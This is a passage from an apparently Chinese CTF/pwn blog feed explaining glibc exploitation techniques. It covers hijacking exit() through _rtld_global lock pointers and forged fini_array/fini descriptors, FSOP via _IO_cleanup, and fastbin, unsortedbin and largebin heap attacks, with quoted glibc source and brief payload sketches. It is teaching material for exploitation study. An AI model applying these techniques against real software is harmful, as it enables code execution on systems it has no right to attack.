l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr: 模块l中fini_arrary节的偏移</span></span><br><span class="line"><span class="comment">                                array: 为模块l的fini_array节的内存地址</span></span><br><span class="line"><span class="comment">                            */</span></span><br><span class="line">                            ElfW(Addr) *<span class="built_in">array</span> = (ElfW(Addr) *)(l-&gt;l_addr + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line"></span><br><span class="line">                            <span class="comment">/* </span></span><br><span class="line"><span class="comment">                                ELF中 fini_arraysz节用来记录fini_array节的大小</span></span><br><span class="line"><span class="comment">                                l-&gt;l_info[DT_FINI_ARRAYSZ]: 模块l中fini_arraysz节描述符</span></span><br><span class="line"><span class="comment">                                l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val: 就是fini_array节的大小, 以B为单位</span></span><br><span class="line"><span class="comment">                                i: fini_array节的大小/一个指针大小, 即fini_array中有多少个析构函数</span></span><br><span class="line"><span class="comment">                            */</span></span><br><span class="line">                            <span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val / <span class="keyword">sizeof</span>(ElfW(Addr)));</span><br><span class="line">                            <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)    <span class="comment">//从后往前, 调用fini_array中的每一个析构函数</span></span><br><span class="line">                                ((<span class="type">fini_t</span>)<span class="built_in">array</span>[i])();</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="comment">/* 调用fini段中的函数 */</span></span><br><span class="line">                        <span class="keyword">if</span> (l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">                            DL_CALL_DT_FINI(l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    ...;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* Correct the previous increment.  */</span></span><br><span class="line">                --l-&gt;l_direct_opencount;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="思考2-rtdl-fini-带来的可利用点"><a href="#思考2-rtdl-fini-带来的可利用点" class="headerlink" title="思考2:rtdl_fini()带来的可利用点"></a>思考2:rtdl_fini()带来的可利用点</h2><p><strong>rtdl_fini()十分依赖与rtld_global这一数据结构, 并且rtld_global中的数据并没有被加密</strong>, 这就带来了两个攻击面</p><ul><li><strong>劫持rtld_global中的锁相关函数指针</strong></li><li><strong>修改rtld_global中的l_info, 伪造fini_array/ fini的节描述符, 从而劫持fini_array/ fini到任意位置, 执行任意函数</strong></li></ul><h3 id="0x1劫持rtld-global中的函数指针"><a href="#0x1劫持rtld-global中的函数指针" class="headerlink" title="0x1劫持rtld_global中的函数指针"></a>0x1劫持rtld_global中的函数指针</h3><p>ld相关函数在使用rtld_global时都需要先上锁, 以避免多进程下的条件竞争问题</p><p>相关函数包括但不限于:</p><ul><li>_dl_open()</li><li>_dl_fini()</li><li>….</li></ul><p>上锁操作是通过宏进行的, 宏定义:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> __rtld_lock_lock_recursive(NAME) GL(dl_rtld_lock_recursive) (&amp;(NAME).mutex)</span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> GL(name) _rtld_global._##name</span></span><br></pre></td></tr></table></figure><p>查看宏<code>GL</code>的定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">if</span> IS_IN (rtld)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> GL(name) _rtld_local._##name</span></span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> GL(name) _rtld_global._##name</span></span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>宏展开:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    __rtld_lock_lock_recursive(GL(dl_load_lock)); <span class="comment">//对rtld_global上锁</span></span><br><span class="line">=&gt;    GL(dl_rtld_lock_recursive) (&amp; GL(dl_load_lock).mutex)</span><br><span class="line">=&gt;    _rtld_global.dl_rtld_lock_recursive(&amp;_rtld_global.dl_load_lock.mutex)</span><br></pre></td></tr></table></figure><p>可以看到实际调用的是dl_rtld_lock_recursive函数指针</p><p>释放锁的操作也是类似的, 调用的是_dl_rtld_unlock_recursive函数指针, 这两个函数指针再rtld_global中定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtld_global</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ...;</span><br><span class="line">    <span class="type">void</span> (*_dl_rtld_lock_recursive)(<span class="type">void</span> *);</span><br><span class="line">    <span class="type">void</span> (*_dl_rtld_unlock_recursive)(<span class="type">void</span> *);</span><br><span class="line">    ...;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ld作为mmap的文件, 与libc地址固定</strong></p><p><strong>也就是说, 当有了任意写+libc地址后, 我们可以通过覆盖_rtld_global中的lock/ unlock函数指针来getshell</strong></p><h3 id="0x2劫持l-info伪造fini-array节"><a href="#0x2劫持l-info伪造fini-array节" class="headerlink" title="0x2劫持l_info伪造fini_array节"></a>0x2劫持l_info伪造fini_array节</h3><p>我们的目标是伪造rtld_global中关于fini_array节与fini_arraysize节的描述</p><p>将fini_array节迁移到一个可控位置, 比如堆区, 然后在这个可控位置中写入函数指针, 那么在exit()时就会依次调用其中的函数指针</p><p><strong>l_info中关于fini_array节的描述符下标为26, 关于fini_arraysz节的下标是28,l_info中的指针正好指向的就是Dynamic段中相关段描述符</strong></p><p>此时我们就可以回答ELF中fini_array中的析构函数是怎么被调用的这个问题了:</p><p><strong>exit()调用__exit_funcs链表中的_rtdl_fini()函数, 由_rtdl_fini()函数寻找到ELF的fini_array节并调用</strong></p><p>假设我们修改rtld_global中的l_info[0x1a]为addrA, 修改l_info[0x1c]为addrB</p><p>那么首先在addrA addrB中伪造好描述符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">addrA: flat(0x1a, addrC)</span><br><span class="line">addrB: flat(0x1b, N)</span><br></pre></td></tr></table></figure><p><strong>然后在addrC中写入函数指针就可以在exit时执行了</strong></p><h3 id="0x3fini-array与ROP-SROP"><a href="#0x3fini-array与ROP-SROP" class="headerlink" title="0x3fini_array与ROP(SROP)"></a>0x3fini_array与ROP(SROP)</h3><p>当我们可以劫持fini_array之后, 我们就具备了连续调用多个函数的能力, 那么有无可能像ROP一样, 让多个函数进行组合, 完成复杂的工作?</p><p>多个fini_array函数调用之间, 寄存器环境十分稳定, 只有: rdx r13会被破坏, 这是一个好消息</p><p>考察执行call时的栈环境, 我们发现rdi总是指向一个可读可写区域, 可以当做我们函数的缓冲区</p><p>那么就已经有了大致的利用思路,</p><ol><li>让fini_array先调用gets()函数, 在rdi中读入SigreturnFrame</li><li>然后再调用setcontext+53, 即可进行SROP, 劫持所有寄存器</li><li>如果高版本libc, setcontext使用rdx作为参数, 那么在gets(rdi)后还需要一个gadget, 能通过rdi设置rdx,<br>再执行setcontext</li></ol><h3 id="0x4劫持fini"><a href="#0x4劫持fini" class="headerlink" title="0x4劫持fini"></a>0x4劫持fini</h3><p>fini段在l_info中下标为13,这个描述符中直接放的就是fini函数指针(前面有提到动态链接下这是个空函数，由_dl_fini调用), 利用手法较为简单, 但是只能执行一个函数, 通常设置为onegadget</p><p>例如我们可以<strong>修改rtld_global中l_info[0xd]为addrA, 然后再addrA中写入</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addrA: flat(0xd, onegadget)</span><br></pre></td></tr></table></figure><p>就可以在exit()时触发</p><h3 id="0x5exit-与FILE"><a href="#0x5exit-与FILE" class="headerlink" title="0x5exit()与FILE"></a>0x5exit()与FILE</h3><p>一开始的run_exit_handlers么, 在遍历完exit_funcs链表后, 还有最后一句</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (run_list_atexit) <span class="comment">//调用_atexit</span></span><br><span class="line">  RUN_HOOK(__libc_atexit, ());</span><br></pre></td></tr></table></figure><p>__libc_atexit其实<strong>是libc中的一个段</strong></p><p><strong>这个段中就是libc退出时的析构函数</strong></p><p><strong>其中默认只有一个函数fcloseall()</strong></p><p>这个函数会调用<strong>_IO_cleanup()</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fcloseall (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* 关闭所有流.  */</span></span><br><span class="line"><span class="keyword">return</span> _IO_cleanup ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>_IO_cleanup()会调用两个函数</strong></p><ul><li><strong>_IO_flush_all_lockp()会通过_IO_list_all遍历所有流, 对每个流调用_IO_OVERFLOW(fp), 保证关闭前缓冲器中没有数据残留</strong></li><li><strong>_IO_unbuffer_all()会通过_IO_list_all遍历所有流, 对每个流调用_IO_SETBUF(fp, NULL, 0)即无缓冲模式, 来释放流的缓冲区</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _IO_cleanup(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* 刷新所有流 */</span></span><br><span class="line">  <span class="type">int</span> result = _IO_flush_all_lockp(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 关闭所有流的缓冲区 */</span></span><br><span class="line">  _IO_unbuffer_all();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">  _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (fp = (_IO_FILE *) _IO_list_all; fp != <span class="literal">NULL</span>; fp = fp-&gt;_chain)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">_IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">   )</span><br><span class="line">  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">result = EOF;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">_IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_lock_unlock (list_all_lock);</span><br><span class="line">  _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">_IO_unbuffer_all (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">  _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (fp = (_IO_FILE *) _IO_list_all; fp; fp = fp-&gt;_chain)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (! (fp-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">  <span class="comment">/* Iff stream is un-orientated, it wasn&#x27;t used. */</span></span><br><span class="line">  &amp;&amp; fp-&gt;_mode != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="type">int</span> cnt;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXTRIES 2</span></span><br><span class="line">  <span class="keyword">for</span> (cnt = <span class="number">0</span>; cnt &lt; MAXTRIES; ++cnt)</span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_lock == <span class="literal">NULL</span> || _IO_lock_trylock (*fp-&gt;_lock) == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="comment">/* Give the other thread time to finish up its use of the</span></span><br><span class="line"><span class="comment"> stream.  */</span></span><br><span class="line">      __sched_yield ();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (! dealloc_buffers &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_USER_BUF;</span><br><span class="line"></span><br><span class="line">      fp-&gt;_freeres_list = freeres_list;</span><br><span class="line">      freeres_list = fp;</span><br><span class="line">      fp-&gt;_freeres_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  _IO_SETBUF (fp, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">    _IO_wsetb (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (cnt &lt; MAXTRIES &amp;&amp; fp-&gt;_lock != <span class="literal">NULL</span>)</span><br><span class="line">    _IO_lock_unlock (*fp-&gt;_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Make sure that never again the wide char functions can be</span></span><br><span class="line"><span class="comment"> used.  */</span></span><br><span class="line">      fp-&gt;_mode = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_lock_unlock (list_all_lock);</span><br><span class="line">  _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现攻击点:</p><ol><li><p>libc2.23以前三个标准流的vtable是可写的,可以修改函数指针</p></li><li><p>之后的版本因为位于libc段中的vtable是无法写入的,故可以选择伪造vtable中的setbuf或overflow(其中overflow需要达到一些条件)函数,来达到getshell</p></li></ol><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="2018hctf-the-end"><a href="#2018hctf-the-end" class="headerlink" title="2018hctf-the_end"></a>2018hctf-the_end</h2><p>这道题有两种解法，但都是利用exit函数</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> exit </tag>
            
            <tag> pwn技巧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆利用-3</title>
      <link href="/posts/11792/"/>
      <url>/posts/11792/</url>
      
        <content type="html"><![CDATA[<span class='p blue'>一些零碎的东西</span><h1 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h1><p>主要漏洞侧重于利用 <code>free</code> 函数释放<strong>真的 chunk 或伪造的 chunk</strong>，然后再次申请 chunk 进行攻击，或故意修改 <code>fd</code> 指针，直接利用 <code>malloc</code> 申请指定位置 chunk 进行攻击。</p><p><strong>直接改写freelist中的fd指针的话,不要求地址对齐</strong></p><p><strong>free释放假chunk需要地址对齐</strong></p><p><strong>fastbins取出时,会进行该chunk的大小所对应的索引和当前链索引是否相同</strong></p><h2 id="Fastbin-Double-Free"><a href="#Fastbin-Double-Free" class="headerlink" title="Fastbin Double Free"></a>Fastbin Double Free</h2><h3 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h3><p><strong>简介:</strong> fastbin double free 我们可以使用多个指针控制同一个堆块，这可以用于篡改一些堆块中的关键数据域或者是实现类似于类型混淆的效果。 如果更进一步修改 fd 指针，则能够实现任意地址分配堆块的效果 (首先要通过验证)，这就相当于任意地址写任意值的效果。</p><p><strong>利用条件:</strong>能多次free同一chunk</p><p><strong>利用效果:</strong>得到两个指向同一chunk的指针</p><p><strong>有效版本:</strong>ALL</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。</p><h2 id="Alloc-to-Anywhere"><a href="#Alloc-to-Anywhere" class="headerlink" title="Alloc to Anywhere"></a>Alloc to Anywhere</h2><h3 id="概要-1"><a href="#概要-1" class="headerlink" title="概要"></a>概要</h3><p><strong>简介:</strong>该技术的核心点在于劫持 fastbin 链表中 chunk 的 fd 指针，把 fd 指针指向我们想要分配的栈上</p><p><strong>利用条件:</strong>能劫持chunk的fd指针</p><p><strong>利用效果:</strong>任意分配chunk</p><p><strong>有效版本:</strong>ALL</p><p><strong>限制:</strong>2.32及以上版本fastbin加密,写fd指针需要能够泄露堆地址,并进行一些额外处理</p><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>利用了UAF,再free后又去改写该chunk的fd指针,使其指向内存中一个可以被视为fastbin_chunk的内存空间(size域合适等)</p><p>指向的chunk要绕过该检测,该chunk的大小计算出的idx要与该链的索引idx相匹配</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">    errout:</span><br><span class="line">      malloc_printerr (check_action, errstr, chunk2mem (victim));</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="unsortedbin-attack"><a href="#unsortedbin-attack" class="headerlink" title="unsortedbin attack"></a>unsortedbin attack</h1><h2 id="概要-2"><a href="#概要-2" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong></p><p><strong>利用条件:</strong>uaf,能够劫持chunk的bk指针</p><p><strong>利用效果:</strong>任意地址写上unsorted+96(+88)</p><p><strong>有效版本:</strong>2.29以前</p><p><strong>失效原因:</strong>2.29新增unsortedbin取出时bk链完整性</p><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p><strong>什么情况下会被放入unsortedbin</strong></p><ol><li>当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。(即last remainer)</li><li>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。</li><li>当进行 malloc_consolidate 时，若合并后不与top chunk相邻,则会将合并后的chunk放入unsortedbin。</li></ol><p><strong>使用情况</strong></p><ol><li>unsortedbin采用的是FIFO,<strong>即插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取</strong>。加入的时候利用fd,取出的时候利用bk</li><li>在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，<strong>否则就会把这些 chunk 分别插入到对应的 bin 中</strong>。</li></ol><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><p>Unsorted Bin Attack 被利用的前提是控制 Unsorted Bin Chunk 的 bk 指针。</p><p>Unsorted Bin Attack 可以达到的效果是实现修改任意地址值为一个较大的数值。</p><p>以及辅助泄露main_arena地址</p><p>其利用的函数片段为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><p>即将取出的chunk的上一个chunk的fd指针写为unsorted_chunks (av)</p><p>不难看出要攻击就要能修改某个chunk的bk指针,达到的效果是将&amp;bins[0]-2会被写入指定位置</p><p>这里可以看到 unsorted bin attack 确实可以修改任意地址的值，但是所修改成的值却不受我们控制，</p><ul><li>通过修改循环的次数来使得程序可以执行多次循环。</li><li>可以修改 heap 中的 <strong>global_max_fast 来使得更大的 chunk 可以被视为 fast bin</strong>，这样我们就可以去执行一些 fast bin attack 了。</li></ul><p><strong>注意:</strong></p><p>当进行完unsorted bin attack</p><p>unsortedbin都会损坏</p><p>但分两种情况:</p><ol><li>原本unsortedbin中只有一个chunk,利用完后unsorted的取出与放入都将被禁止</li><li>原本不止一个chunk,利用完后取出操作被禁止</li></ol><hr><p><strong>另一种利用方法</strong>:</p><p>修改bk,使其指向一个fakechunk,并且fakechunk</p><ol><li>size符合申请大小</li><li>fd字段可写</li><li>bk字段指向可写区域</li></ol><p>这样当被构造的unsortedbin被取出后下一次取出就会取出fakechunk,且大小合适的话就会直接退出</p><p>最好大小合适因为不合适的话就找不到出口了</p><h2 id="失效"><a href="#失效" class="headerlink" title="失效"></a>失效</h2><p>加了一个检测</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);</span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><h1 id="largebin-attack"><a href="#largebin-attack" class="headerlink" title="largebin attack"></a>largebin attack</h1><h2 id="概要-3"><a href="#概要-3" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>这种攻击方式主要利用的是 chunk 进入 bin 中的操作，在 malloc 的时候，遍历 unsorted bin 时，对每一个 chunk，若无法 exact-fit 分配或不满足切割分配的条件，就会将该 chunk 置入相应的 bin 中，而此过程中缺乏对 largebin 的跳表指针的检测。</p><p><strong>利用条件:</strong></p><ol><li>可以修改一个large bin chunk的data</li></ol><p><strong>利用效果:</strong>任意地址写上chunk地址,辅助 Tcache Stash Unlink+ 攻击,可以修改 _IO_list_all 便于伪造 _IO_FILE 结构体进行 FSOP。是诸多house系列的重要前提</p><p><strong>有效版本:</strong>all/2.30以前</p><h2 id="基础-1"><a href="#基础-1" class="headerlink" title="基础"></a>基础</h2><p>在index相同的情况下：</p><ol><li><p>一般空闲的large chunk在fd的遍历顺序中，<strong>按照由大到小的顺序排列</strong>。这样可以避免在寻找合适chunk时挨个遍历</p></li><li><p>如果大小相同，chunk放置在处于nextsize链上的chunk的下一个</p></li><li>多个大小相同的堆块，只有首堆块的fd_nextsize和bk_nextsize会指向其他堆块，后面的堆块的fd_nextsize和bk_nextsize均为0</li><li>size最大的chunk的bk_nextsize指向最小的chunk，size最小的chunk的fd_nextsize指向最大的chunk</li></ol><p>空闲chunk的结构与unsorted和small的差别就在于多了fd_nextsize和bk_nextsize,分别指向下一个<strong>大小</strong>的chunk和上一个大小的chunk,且chunk在largebin free list中按从大到小排序是重要细节</p><h2 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h2><p><strong>unsorted处理将chunk放入largebin中的操作</strong>(2.38)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 